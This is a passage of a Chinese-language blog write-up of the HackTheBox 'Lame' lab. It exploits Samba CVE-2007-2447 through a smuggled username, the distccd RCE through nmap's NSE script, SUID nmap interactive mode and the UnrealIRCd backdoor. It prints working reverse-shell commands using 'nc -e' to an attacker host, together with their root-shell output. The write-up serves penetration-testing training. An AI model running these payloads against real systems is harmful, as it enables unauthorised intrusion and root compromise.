</span></span></span><span class="line"><span class="cl"><span class="s1">                                        [ &#39;</span>OSVDB<span class="s1">&#39;, &#39;</span>34700<span class="s1">&#39; ],
</span></span></span><span class="line"><span class="cl"><span class="s1">                                        [ &#39;</span>BID<span class="s1">&#39;, &#39;</span>23972<span class="s1">&#39; ],
</span></span></span><span class="line"><span class="cl"><span class="s1">                                        [ &#39;</span>URL<span class="s1">&#39;, &#39;</span>http://labs.idefense.com/intelligence/vulnerabilities/display.php?id<span class="o">=</span>534<span class="s1">&#39; ],
</span></span></span><span class="line"><span class="cl"><span class="s1">                                        [ &#39;</span>URL<span class="s1">&#39;, &#39;</span>http://samba.org/samba/security/CVE-2007-2447.html<span class="s1">&#39; ]
</span></span></span><span class="line"><span class="cl"><span class="s1">                                ],
</span></span></span><span class="line"><span class="cl"><span class="s1">                         &#39;</span>Platform<span class="s1">&#39;       =&gt; [&#39;</span>unix<span class="err">&#39;</span><span class="o">]</span>,
</span></span><span class="line"><span class="cl"> 
</span></span></code></pre></div><p>看到CVE编号：2007-2447</p>
<h3 id="github">Github</h3>
<p>Github找利用脚本</p>
<p>随便找了一个，https://github.com/amriunix/CVE-2007-2447，安装依赖<code>$ pip install pysmb</code>，按照说明运行：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> $ python3 usermap_script.py 
</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> CVE-2007-2447 - Samba usermap script
</span></span><span class="line"><span class="cl"> <span class="o">[</span>-<span class="o">]</span> usage: python usermap_script.py &lt;RHOST&gt; &lt;RPORT&gt; &lt;LHOST&gt; &lt;LPORT&gt;
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> $ nc -l -v -p <span class="m">4444</span> 
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> $ python3 usermap_script.py 10.10.10.3 <span class="m">139</span> 10.10.14.2 <span class="m">4444</span>
</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> CVE-2007-2447 - Samba usermap script
</span></span><span class="line"><span class="cl"> <span class="o">[</span>+<span class="o">]</span> Connecting !
</span></span><span class="line"><span class="cl"> <span class="o">[</span>+<span class="o">]</span> Payload was sent - check netcat !
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> $ nc -l -v -p <span class="m">4444</span>   
</span></span><span class="line"><span class="cl"> listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
</span></span><span class="line"><span class="cl"> 10.10.10.3: inverse host lookup failed: Unknown host
</span></span><span class="line"><span class="cl"> connect to <span class="o">[</span>10.10.14.2<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.3<span class="o">]</span> <span class="m">36956</span>
</span></span><span class="line"><span class="cl"> whoami
</span></span><span class="line"><span class="cl"> root
</span></span><span class="line"><span class="cl"> whereis python
</span></span><span class="line"><span class="cl"> python: /usr/bin/python2.5-config /usr/bin/python /usr/bin/python2.5 /etc/python /etc/python2.5 /usr/lib/python2.3 /usr/lib/python2.5 /usr/lib/python2.4 /usr/local/lib/python2.5 /usr/include/python2.5 /usr/share/python /usr/share/man/man1/python.1.gz
</span></span><span class="line"><span class="cl"> python -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl"> root@lame:/# find / -name user.txt
</span></span><span class="line"><span class="cl"> find / -name user.txt
</span></span><span class="line"><span class="cl"> /home/makis/user.txt
</span></span><span class="line"><span class="cl"> root@lame:/# cat /home/makis/user.txt
</span></span><span class="line"><span class="cl"> cat /home/makis/user.txt
</span></span><span class="line"><span class="cl"> 83bb7c7fff163562d48ac4ba14316025
</span></span><span class="line"><span class="cl"> root@lame:/# cat /root/root.txt
</span></span><span class="line"><span class="cl"> cat /root/root.txt
</span></span><span class="line"><span class="cl"> 848a15387ca22dcf38b1cdc8538223a0
</span></span><span class="line"><span class="cl"> root@lame:/#
</span></span></code></pre></div><h3 id="crackmapexec">crackmapexec</h3>
<p>来自参考文献2</p>
<p><code>more /usr/share/exploitdb/exploits/unix/remote/16320.rb</code> 分析漏洞利用脚本，发现name 字段为</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"> <span class="s2">&#34;/=`nohup &#34;</span> <span class="o">+</span> <span class="n">payload</span><span class="o">.</span><span class="n">encoded</span> <span class="o">+</span> <span class="s2">&#34;`&#34;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> $ crackmapexec smb --shares 10.10.10.3 -u <span class="s1">&#39;./=`nohup nc -e /bin/sh 10.10.14.2 4445`&#39;</span> -p <span class="s1">&#39;&#39;</span>                                           
</span></span><span class="line"><span class="cl"> SMB         10.10.10.3     <span class="m">445</span>   LAME             <span class="o">[</span>*<span class="o">]</span> Unix <span class="o">(</span>name:LAME<span class="o">)</span> <span class="o">(</span>domain:hackthebox.gr<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
</span></span></code></pre></div><p>另一边做监听<code>$ nc -lvnp 4445</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> $ nc -lvnp <span class="m">4445</span>
</span></span><span class="line"><span class="cl"> listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4445</span> ...
</span></span><span class="line"><span class="cl"> connect to <span class="o">[</span>10.10.14.2<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.3<span class="o">]</span> <span class="m">59300</span>
</span></span><span class="line"><span class="cl"> whoami
</span></span><span class="line"><span class="cl"> root
</span></span></code></pre></div><p>Metasploit 使用 nohup 命令，即 no hang up的缩写，这是 Linux 系统中的一个命令，即使在退出 shell 或终端并在当前上下文之外启动进程然后是有效负载之后，它也能保持进程运行。</p>
<p>总结：Lame 是利用Samba的命令注入漏洞直接获取root权限</p>
<h2 id="4-distccd">4. distccd</h2>
<p>看了参考文献2后，才发现还少了一个点没有发现，这边我不写了，直接看原文吧。</p>
<hr>
<p>想了想还是再从这个点再做一次，多练习练习。</p>
<p>nmap 默认扫描未发现该端口，需要进行全端口才可以。这里用masscan快速扫描</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> $ sudo masscan -e tun0 -p- --max-rate <span class="m">500</span> 10.10.10.3
</span></span><span class="line"><span class="cl"> Starting masscan 1.3.2 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2022-03-17 05:45:11 GMT
</span></span><span class="line"><span class="cl"> Initiating SYN Stealth Scan
</span></span><span class="line"><span class="cl"> Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span></span><span class="line"><span class="cl"> Discovered open port 139/tcp on 10.10.10.3 
</span></span><span class="line"><span class="cl"> Discovered open port 22/tcp on 10.10.10.3  
</span></span><span class="line"><span class="cl"> Discovered open port 445/tcp on 10.10.10.3 
</span></span><span class="line"><span class="cl"> Discovered open port 3632/tcp on 10.10.10.3 
</span></span><span class="line"><span class="cl"> Discovered open port 21/tcp on 10.10.10.3
</span></span></code></pre></div><p>nmap 做细分扫描，扫特定端口的服务详情，并用上NSE</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> $ sudo nmap -T4 -sSV -sC -p3632 10.10.10.3          
</span></span><span class="line"><span class="cl"> Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-03-17 13:52 HKT
</span></span><span class="line"><span class="cl"> Nmap scan report <span class="k">for</span> 10.10.10.3
</span></span><span class="line"><span class="cl"> Host is up <span class="o">(</span>0.29s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> PORT     STATE SERVICE VERSION
</span></span><span class="line"><span class="cl"> 3632/tcp open distccd distccd v1 <span class="o">((</span>GNU<span class="o">)</span> 4.2.4 <span class="o">(</span>Ubuntu 4.2.4-1ubuntu4<span class="o">))</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl"> Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 8.28 seconds
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> $ locate *.nse <span class="p">|</span> grep distcc
</span></span><span class="line"><span class="cl"> /usr/share/nmap/scripts/distcc-cve2004-2687.nse
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> $ sudo nmap -T4 --script distcc* -p3632 10.10.10.3                
</span></span><span class="line"><span class="cl"> Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-03-17 13:57 HKT
</span></span><span class="line"><span class="cl"> Nmap scan report <span class="k">for</span> 10.10.10.3
</span></span><span class="line"><span class="cl"> Host is up <span class="o">(</span>0.24s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> PORT     STATE SERVICE
</span></span><span class="line"><span class="cl"> 3632/tcp open distccd
</span></span><span class="line"><span class="cl"> <span class="p">|</span> distcc-cve2004-2687: 
</span></span><span class="line"><span class="cl"> <span class="p">|</span>   VULNERABLE:
</span></span><span class="line"><span class="cl"> <span class="p">|</span>   distcc Daemon Command Execution
</span></span><span class="line"><span class="cl"> <span class="p">|</span>     State: VULNERABLE <span class="o">(</span>Exploitable<span class="o">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span>     IDs: CVE:CVE-2004-2687
</span></span><span class="line"><span class="cl"> <span class="p">|</span>     Risk factor: High CVSSv2: 9.3 <span class="o">(</span>HIGH<span class="o">)</span> <span class="o">(</span>AV:N/AC:M/Au:N/C:C/I:C/A:C<span class="o">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span>       Allows executing of arbitrary commands on systems running distccd 3.1 and
</span></span><span class="line"><span class="cl"> <span class="p">|</span>       earlier. The vulnerability is the consequence of weak service configuration.
</span></span><span class="line"><span class="cl"> <span class="p">|</span>       
</span></span><span class="line"><span class="cl"> <span class="p">|</span>     Disclosure date: 2002-02-01
</span></span><span class="line"><span class="cl"> <span class="p">|</span>     Extra information:
</span></span><span class="line"><span class="cl"> <span class="p">|</span>       
</span></span><span class="line"><span class="cl"> <span class="p">|</span>     <span class="nv">uid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span>   
</span></span><span class="line"><span class="cl"> <span class="p">|</span>     References:
</span></span><span class="line"><span class="cl"> <span class="p">|</span>       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
</span></span><span class="line"><span class="cl"> <span class="p">|</span>       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2004-2687
</span></span><span class="line"><span class="cl"> <span class="p">|</span>_     https://distcc.github.io/security.html
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 2.88 seconds
</span></span></code></pre></div><p>网上查distccd的资料：</p>
<blockquote>
<p><em>distccd</em> is the server for the <em><strong>distcc</strong>(1)</em> distributed compiler. It accepts and runs compilation jobs for network clients.</p>
</blockquote>
<p><code>more /usr/share/nmap/scripts/distcc-cve2004-2687.nse</code>查看NSE脚本的具体内容：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> $ more /usr/share/nmap/scripts/distcc-cve2004-2687.nse
</span></span><span class="line"><span class="cl"> .....
</span></span><span class="line"><span class="cl"> <span class="nv">description</span> <span class="o">=</span> <span class="o">[[</span>
</span></span><span class="line"><span class="cl"> Detects and exploits a remote code execution vulnerability in the distributed
</span></span><span class="line"><span class="cl"> compiler daemon distcc. The vulnerability was disclosed in 2002, but is still
</span></span><span class="line"><span class="cl"> present in modern implementation due to poor configuration of the service.
</span></span><span class="line"><span class="cl"> <span class="o">]]</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> ---
</span></span><span class="line"><span class="cl"> -- @usage
</span></span><span class="line"><span class="cl"> -- nmap -p <span class="m">3632</span> &lt;ip&gt; --script distcc-exec --script-args<span class="o">=</span><span class="s2">&#34;distcc-exec.cmd=&#39;id&#39;&#34;</span>
</span></span><span class="line"><span class="cl"> ...
</span></span></code></pre></div><p>可以看到<code>distcc-exec.cmd</code>参数即为所执行的命令，将其改为连接命令，如<code>nc -e /bin/bash 10.10.14.2 4444</code>，</p>
<p>用<code>nmap -p 3632 &lt;ip&gt; --script distcc-exec --script-args=&quot;distcc-exec.cmd='id'&quot;</code>这种方法出现了很多意料之外的问题，无法成功获得shell。排查中&hellip;</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> NSE: failed to initialize the script engine: 
</span></span><span class="line"><span class="cl"> /usr/bin/../share/nmap/nse_main.lua:822: <span class="s1">&#39;distcc-exec&#39;</span> did not match a category, filename, or directory
</span></span><span class="line"><span class="cl"> stack traceback:
</span></span><span class="line"><span class="cl">        <span class="o">[</span>C<span class="o">]</span>: in <span class="k">function</span> <span class="s1">&#39;error&#39;</span>
</span></span><span class="line"><span class="cl">        /usr/bin/../share/nmap/nse_main.lua:822: in <span class="nb">local</span> <span class="s1">&#39;get_chosen_scripts&#39;</span>         
</span></span><span class="line"><span class="cl">        /usr/bin/../share/nmap/nse_main.lua:1322: in main chunk 
</span></span><span class="line"><span class="cl">        <span class="o">[</span>C<span class="o">]</span>: in ?                                                           
</span></span><span class="line"><span class="cl">         
</span></span><span class="line"><span class="cl"> QUITTING!        
</span></span></code></pre></div><p>排查结果出来了，虽然用法中写着distcc-exec，但nmap其实并无法识别，只能用全名，对应的后面也需要修改。改成如下后，可成功执行</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> $ sudo nmap -p3632 10.10.10.3 --script<span class="o">=</span>distcc-cve2004-2687.nse --script-args<span class="o">=</span><span class="s2">&#34;distcc-cve2004-2687.cmd=&#39;nc -e /bin/bash 10.10.14.2 4444&#39;&#34;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> $ nc -lvnp <span class="m">4444</span>
</span></span><span class="line"><span class="cl"> listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
</span></span><span class="line"><span class="cl"> connect to <span class="o">[</span>10.10.14.2<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.3<span class="o">]</span> <span class="m">42558</span>
</span></span><span class="line"><span class="cl"> 
</span></span></code></pre></div><p><img loading="lazy" src="/resource/HTB%e9%9d%b6%e6%9c%ba-Lame-WriteUp.assets/640-20230220174729769.png" srcset="/resource/HTB%e9%9d%b6%e6%9c%ba-Lame-WriteUp.assets/640-20230220174729769.png, /resource/HTB%e9%9d%b6%e6%9c%ba-Lame-WriteUp.assets/640-20230220174729769.png 1.5x, /resource/HTB%e9%9d%b6%e6%9c%ba-Lame-WriteUp.assets/640-20230220174729769.png 2x" sizes="auto" data-title="图片" data-alt="图片" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
<p>成功获得了daemon 权限，接下去进行提权</p>
<h3 id="提权1suid---nmap">提权1：SUID - nmap</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> └─$ nc -lvnp <span class="m">4444</span>
</span></span><span class="line"><span class="cl"> listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
</span></span><span class="line"><span class="cl"> connect to <span class="o">[</span>10.10.14.2<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.3<span class="o">]</span> <span class="m">42558</span>
</span></span><span class="line"><span class="cl"> whoami
</span></span><span class="line"><span class="cl"> daemon
</span></span><span class="line"><span class="cl"> python -c <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span>    
</span></span><span class="line"><span class="cl"> daemon@lame:/tmp$ find / -type f -perm -u<span class="o">=</span>s 2&gt;/dev/null
</span></span><span class="line"><span class="cl"> find / -type f -perm -u<span class="o">=</span>s 2&gt;/dev/null
</span></span><span class="line"><span class="cl"> /bin/umount
</span></span><span class="line"><span class="cl"> /bin/fusermount
</span></span><span class="line"><span class="cl"> /bin/su
</span></span><span class="line"><span class="cl"> /bin/mount
</span></span><span class="line"><span class="cl"> /bin/ping
</span></span><span class="line"><span class="cl"> /bin/ping6
</span></span><span class="line"><span class="cl"> /sbin/mount.nfs
</span></span><span class="line"><span class="cl"> /lib/dhcp3-client/call-dhclient-script
</span></span><span class="line"><span class="cl"> /usr/bin/sudoedit
</span></span><span class="line"><span class="cl"> /usr/bin/X
</span></span><span class="line"><span class="cl"> /usr/bin/netkit-rsh
</span></span><span class="line"><span class="cl"> /usr/bin/gpasswd
</span></span><span class="line"><span class="cl"> /usr/bin/traceroute6.iputils
</span></span><span class="line"><span class="cl"> /usr/bin/sudo
</span></span><span class="line"><span class="cl"> /usr/bin/netkit-rlogin
</span></span><span class="line"><span class="cl"> /usr/bin/arping
</span></span><span class="line"><span class="cl"> /usr/bin/at
</span></span><span class="line"><span class="cl"> /usr/bin/newgrp
</span></span><span class="line"><span class="cl"> /usr/bin/chfn
</span></span><span class="line"><span class="cl"> /usr/bin/nmap
</span></span><span class="line"><span class="cl"> /usr/bin/chsh
</span></span><span class="line"><span class="cl"> /usr/bin/netkit-rcp
</span></span><span class="line"><span class="cl"> /usr/bin/passwd
</span></span><span class="line"><span class="cl"> /usr/bin/mtr
</span></span><span class="line"><span class="cl"> /usr/sbin/uuidd
</span></span><span class="line"><span class="cl"> /usr/sbin/pppd
</span></span><span class="line"><span class="cl"> /usr/lib/telnetlogin
</span></span><span class="line"><span class="cl"> /usr/lib/apache2/suexec
</span></span><span class="line"><span class="cl"> /usr/lib/eject/dmcrypt-get-device
</span></span><span class="line"><span class="cl"> /usr/lib/openssh/ssh-keysign
</span></span><span class="line"><span class="cl"> /usr/lib/pt_chown
</span></span><span class="line"><span class="cl"> /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
</span></span><span class="line"><span class="cl"> /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
</span></span><span class="line"><span class="cl"> daemon@lame:/tmp$ nmap --version
</span></span><span class="line"><span class="cl"> nmap --version
</span></span><span class="line"><span class="cl"> Nmap version 4.53 <span class="o">(</span> http://insecure.org <span class="o">)</span>
</span></span></code></pre></div><p>发现有nmap，版本为4.53，可以利用进行提权</p>
<blockquote>
<p>nmap 在 2.02 到 5.21 版本中可用交互模式（&ndash;interactive）执行 shell 命令</p>
<p>The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.</p>
</blockquote>
<pre tabindex="0"><code> daemon@lame:/tmp$ nmap --interactive
 nmap --interactive
 
 Starting Nmap V. 4.53 ( http://insecure.org )
 Welcome to Interactive Mode -- press h &lt;enter&gt; for help
 nmap&gt; !sh
 !sh
 sh-3.2# whoami
 whoami
 root
 sh-3.2# cat /root/root.txt
 cat /root/root.txt
 29ad7975c49f5ccb49b735a93efbfc4e
</code></pre><h3 id="提权2ssh-key">提权2：ssh key</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> daemon@lame:/tmp$ cat /root/.ssh/authorized_keys
</span></span><span class="line"><span class="cl"> cat /root/.ssh/authorized_keys
</span></span><span class="line"><span class="cl"> ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w<span class="o">==</span> msfadmin@metasploitable
</span></span></code></pre></div><p>看到msfadmin@metasploitable，最初以为是其他攻击方式留下的，重置主机后发现还是存在，说明是个线索，但是我不知道是什么。参考文章2告诉我是 <code>CVE-2008-0166</code> 的线索，没了解过，<code>$ searchsploit cve-2008-0166</code> 无过，上网搜。</p>
<blockquote>
<p>OpenSSL 0.9.8c-1 up to versions before 0.9.8g-9 on Debian-based operating systems uses a random number generator that generates predictable numbers, which makes it easier for remote attackers to conduct brute force guessing attacks against cryptographic keys.</p>
<p>——https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0166</p>
<p>翻译：基于 Debian 的操作系统上的 OpenSSL 0.9.8c-1 到 0.9.8g-9 之前的版本使用随机数生成器生成可预测的数字，这使得远程攻击者更容易对加密密钥进行暴力猜测攻击。</p>
</blockquote>
<p>expdb搜索：https://www.exploit-db.com/search?cve=2008-0166</p>
<p>看了一个利用脚本，描述步骤如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> <span class="c1"># https://www.exploit-db.com/exploits/5720</span>
</span></span><span class="line"><span class="cl"> <span class="c1"># Autor: hitz - WarCat team (warcat.no-ip.org)</span>
</span></span><span class="line"><span class="cl"> <span class="c1"># Collaborator: pretoriano</span>
</span></span><span class="line"><span class="cl"> <span class="c1">#</span>
</span></span><span class="line"><span class="cl"> <span class="c1"># 1. Download https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/5622.tar.bz2 (debian_ssh_rsa_2048_x86.tar.bz2)</span>
</span></span><span class="line"><span class="cl"> <span class="c1">#</span>
</span></span><span class="line"><span class="cl"> <span class="c1"># 2. Extract it to a directory</span>
</span></span><span class="line"><span class="cl"> <span class="c1">#</span>
</span></span><span class="line"><span class="cl"> <span class="c1"># 3. Execute the python script</span>
</span></span><span class="line"><span class="cl"> <span class="c1">#     - something like: python exploit.py /home/hitz/keys 192.168.1.240 root 22 5</span>
</span></span><span class="line"><span class="cl"> <span class="c1">#     - execute: python exploit.py (without parameters) to display the help</span>
</span></span><span class="line"><span class="cl"> <span class="c1">#     - if the key is found, the script shows something like that:</span>
</span></span><span class="line"><span class="cl"> <span class="c1">#         Key Found in file: ba7a6b3be3dac7dcd359w20b4afd5143-1121</span>
</span></span><span class="line"><span class="cl"> <span class="c1"># Execute: ssh -lroot -p22 -i /home/hitz/keys/ba7a6b3be3dac7dcd359w20b4afd5143-1121 192.168.1.240</span>
</span></span><span class="line"><span class="cl"> <span class="c1">############################################################################</span>
</span></span></code></pre></div><p>因为网络问题没法下载5622.tar.bz2，这边先略过，可见参考文章2：privesc2部分</p>
<h3 id="提权3--unrealircd-backdoored">提权3 : UnrealIRCd Backdoored</h3>
<p>推测由于网络问题，<code>netstat -nltp</code> 数据没能回显过来，从结果中发现6697端口，马上想到 IRC。</p>
<p><code>ps auxww | grep -i unreal</code> 查看unrealIRC进程，发现 <code>UnrealIRCd</code> 以root权限运行。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> ps auxww <span class="p">|</span> grep -i unreal
</span></span><span class="line"><span class="cl"> root     <span class="m">5612</span> 0.0 0.4   <span class="m">8540</span> <span class="m">2488</span> ?       S   01:43   0:00 /usr/bin/unrealircd
</span></span><span class="line"><span class="cl"> root     <span class="m">6522</span> 0.0 0.1   <span class="m">1784</span>   <span class="m">548</span> ?       R   06:01   0:00 grep -i unreal
</span></span></code></pre></div><p>根据这篇文章 unrealircd-3281-backdoored ，我们可以利用此服务来创建后门并拿到root权限</p>
<p>按照参考文章2，做一遍</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> aemon@lame:/tmp$ nc 127.0.0.1 <span class="m">6697</span>
</span></span><span class="line"><span class="cl"> nc 127.0.0.1 <span class="m">6697</span>
</span></span><span class="line"><span class="cl"> :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
</span></span><span class="line"><span class="cl"> :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn<span class="err">&#39;</span>t resolve your hostname<span class="p">;</span> using your IP address instead
</span></span><span class="line"><span class="cl"> ERROR :Closing Link: <span class="o">[</span>127.0.0.1<span class="o">]</span> <span class="o">(</span>Ping timeout<span class="o">)</span>
</span></span></code></pre></div><p>得到 Metasploitable 的输出，这表明我们在正确的方向。为了方便使用后门，我们可以使用已知的connect-back shell方法。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> daemon@lame:/tmp$ <span class="nb">echo</span> <span class="s2">&#34;AB; nc -e /bin/sh 10.10.14.2 5555&#34;</span> <span class="p">|</span> nc 127.0.0.1 <span class="m">6697</span>         
</span></span><span class="line"><span class="cl"> <span class="nb">echo</span> <span class="s2">&#34;AB; nc -e /bin/sh 10.10.14.2 5555&#34;</span> <span class="p">|</span> nc 127.0.0.1 <span class="m">6697</span>
</span></span><span class="line"><span class="cl"> :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
</span></span><span class="line"><span class="cl"> :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn<span class="err">&#39;</span>t resolve your hostname<span class="p">;</span> using your IP address instead
</span></span></code></pre></div><p>另一边</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> └─$ nc -lvnp <span class="m">5555</span>   
</span></span><span class="line"><span class="cl"> listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">5555</span> ...
</span></span><span class="line"><span class="cl"> connect to <span class="o">[</span>10.10.14.2<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.3<span class="o">]</span> <span class="m">39370</span>
</span></span><span class="line"><span class="cl"> whoami
</span></span><span class="line"><span class="cl"> root
</span></span><span class="line"><span class="cl"> cat /root/root.txt
</span></span><span class="line"><span class="cl"> 29ad7975c49f5ccb49b735a93efbfc4e
</span></span></code></pre></div><p>测试发现IRC的6667和6697端口都可以。</p>
<h2 id="他山之石">他山之石</h2>
<ul>
<li><a href="https://hackpentest.in/hackthebox-lame/"target="_blank" rel="external nofollow noopener noreferrer">https://hackpentest.in/hackthebox-lame/</a>  使用了python获取一个完整的tty SHELL <code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code>，同时提供了非MSF思路。</li>
<li><a href="https://coldfusionx.github.io/posts/LameHTB/"target="_blank" rel="external nofollow noopener noreferrer">https://coldfusionx.github.io/posts/LameHTB/</a>  使用了crackmapexec ， 根据现有exp自己复现了利用代码；distccd的攻击思路、提权思路</li>
</ul></div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title=2022-03-23&#32;17:47:01>更新于 2022-03-23&nbsp;</span>
      </div></div>
    <div class="post-info-line">
      <div class="post-info-md"></div>
      <div class="post-info-share">
        <span></span>
      </div>
    </div>
  </div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/htb/' class="post-tag">HTB</a><a href='/tags/oscp/' class="post-tag">OSCP</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
    </section>
  </div>

  <div class="post-nav"><a href="/posts/hackthebox-legacy/htb%E9%9D%B6%E6%9C%BA-legacy-writeup/" class="post-nav-item" rel="prev" title="HTB靶机 Legacy WriteUp"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>HTB靶机 Legacy WriteUp</a>
      <a href="/posts/hackthebox-blue/" class="post-nav-item" rel="next" title="HTB靶机 Blue WriteUp">HTB靶机 Blue WriteUp<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
<div id="comments"><div id="giscus">
          <script
            src="https://giscus.app/client.js"
            data-repo="XavierRoot/XavierBlog"
            data-repo-id="R_kgDOHswyxg"
            data-category="Announcements"
            data-category-id="DIC_kwDOHswyxs4Cd2zm"
            data-mapping="title"
            
            data-theme="preferred_color_scheme"
            data-reactions-enabled="1"
            data-emit-metadata="0"
            data-input-position="bottom"
            data-lang="en"
            data-loading="lazy"
            crossorigin="anonymous"
            async
            defer
          ></script>
        </div>
        <noscript>
